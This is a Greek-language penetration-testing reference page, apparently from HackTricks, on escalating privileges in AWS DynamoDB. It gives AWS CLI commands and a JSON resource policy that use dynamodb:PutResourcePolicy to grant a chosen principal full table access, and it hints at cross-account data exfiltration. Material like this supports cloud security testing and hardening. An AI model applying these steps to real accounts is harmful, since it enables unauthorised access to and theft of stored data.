# AWS - DynamoDB Privesc

{{#include ../../../banners/hacktricks-training.md}}

## dynamodb

Για περισσότερες πληροφορίες σχετικά με το dynamodb, ελέγξτε:

{{#ref}}
../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:PutResourcePolicy`, και προαιρετικά `dynamodb:GetResourcePolicy`

Από τον Μάρτιο του 2024, η AWS προσφέρει *πολιτικές βασισμένες σε πόρους* για το DynamoDB ([AWS News](https://aws.amazon.com/about-aws/whats-new/2024/03/amazon-dynamodb-resource-based-policies/)).

Έτσι, αν έχετε το `dynamodb:PutResourcePolicy` για έναν πίνακα, μπορείτε απλά να παραχωρήσετε στον εαυτό σας ή σε οποιονδήποτε άλλο κύριο πλήρη πρόσβαση στον πίνακα.

Η παραχώρηση του `dynamodb:PutResourcePolicy` σε έναν τυχαίο κύριο συμβαίνει συχνά κατά λάθος, αν οι διαχειριστές νομίζουν ότι η παραχώρηση του `dynamodb:Put*` θα επιτρέψει μόνο στον κύριο να προσθέσει στοιχεία στη βάση δεδομένων - ή αν παραχώρησαν αυτό το σύνολο δικαιωμάτων πριν από τον Μάρτιο του 2024...

Ιδανικά, έχετε επίσης το `dynamodb:GetResourcePolicy`, ώστε να μην αντικαταστήσετε άλλες δυνητικά ζωτικές άδειες, αλλά μόνο να εισάγετε τις πρόσθετες άδειες που χρειάζεστε:
```bash
# get the current resource based policy (if it exists) and save it to a file
aws dynamodb get-resource-policy \
--resource-arn <table_arn> \
--query 'Policy' \
--output text > policy.json
```
Αν δεν μπορείτε να ανακτήσετε την τρέχουσα πολιτική, απλώς χρησιμοποιήστε αυτήν που παρέχει πλήρη πρόσβαση στον πίνακα στον κύριο σας:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "FullAccessToDynamoDBTable",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<ACCOUNT_ID>:<USER_OR_ROLE>/<USERNAME_OR_ROLENAME>"
},
"Action": [
"dynamodb:*"
],
"Resource": [
"arn:aws:dynamodb:<REGION>:<AWS_ACCOUNT_ID>:table/<TABLENAME>"
]
}
]
}
```
Αν χρειάζεστε να το προσαρμόσετε, εδώ είναι μια λίστα με όλες τις δυνατές ενέργειες DynamoDB: [AWS Documentation](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Operations.html). Και εδώ είναι μια λίστα με όλες τις ενέργειες που μπορούν να επιτραπούν μέσω μιας πολιτικής βασισμένης σε πόρους *ΚΑΙ ποιες από αυτές μπορούν να χρησιμοποιηθούν διασυνοριακά (σκεφτείτε την εξαγωγή δεδομένων!)*: [AWS Documentation](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/rbac-iam-actions.html)

Τώρα, με το έγγραφο πολιτικής `policy.json` έτοιμο, βάλτε την πολιτική πόρου:
```bash
# put the new policy using the prepared policy file
# dynamodb does weirdly not allow a direct file upload
aws dynamodb put-resource-policy \
--resource-arn <table_arn> \
--policy "$(cat policy.json)"
```
Τώρα, θα πρέπει να έχετε τις άδειες που χρειάζεστε.

### Post Exploitation

Όσο γνωρίζω, **δεν υπάρχει άλλος άμεσος τρόπος για να κλιμακώσετε τις άδειες στο AWS απλά με το να έχετε κάποιες άδειες `dynamodb`**. Μπορείτε να **διαβάσετε ευαίσθητες** πληροφορίες από τους πίνακες (οι οποίες θα μπορούσαν να περιέχουν διαπιστευτήρια AWS) και **να γράψετε πληροφορίες στους πίνακες** (οι οποίες θα μπορούσαν να προκαλέσουν άλλες ευπάθειες, όπως οι επιθέσεις κώδικα lambda...) αλλά όλες αυτές οι επιλογές έχουν ήδη ληφθεί υπόψη στη **σελίδα Post Exploitation του DynamoDB**:

{{#ref}}
../aws-post-exploitation/aws-dynamodb-post-exploitation.md
{{#endref}}

### TODO: Διαβάστε δεδομένα εκμεταλλευόμενοι τα data Streams

{{#include ../../../banners/hacktricks-training.md}}
